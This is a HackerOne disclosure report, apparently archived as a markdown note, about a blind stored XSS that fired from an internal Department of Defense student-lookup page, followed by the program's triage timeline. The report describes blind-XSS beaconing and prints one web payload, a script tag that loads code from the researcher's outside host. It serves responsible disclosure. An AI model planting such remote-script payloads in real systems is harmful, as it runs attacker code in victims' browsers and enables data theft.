---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2024-08-16
submitted: 2020-07-14T23:16:35.723Z
bounty_usd: null
votes: 28
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "sp1d3rs"
source: "https://hackerone.com/reports/923912"
title: "Blind Stored XSS on the internal host - █████████████"
---
# Blind Stored XSS on the internal host - █████████████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 28 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-08-16

- Report: [https://hackerone.com/reports/923912](https://hackerone.com/reports/923912)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-07-14T23:16:35.723Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Description
Hello. I often use mine `xp.ht` host as a beacon for SSRF/XSS payloads, and today one was triggered from the `https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&&` endpoint (it was found in the Referer header)

This domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.

##POC
███████
Sadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.
The `GET /?_=1594756841631` indicated that payload is likely reside in HTML source, and was triggered during student lookup (perhaps there is payload  somewhere in the student data containing `<script src=//xp.ht></script>` or similar).
You may need to confirm this with system owner first since I don't have enough details to confirm it from my side since vulnerable host is internal.

## Impact

Blind Stored XSS on the internal host.

## Timeline

- **Report Filed**
- **2020-07-14** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **2020-07-15** @agent-l8: @sp1d3rs we will send it forward and see if they can action this. Thanks
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
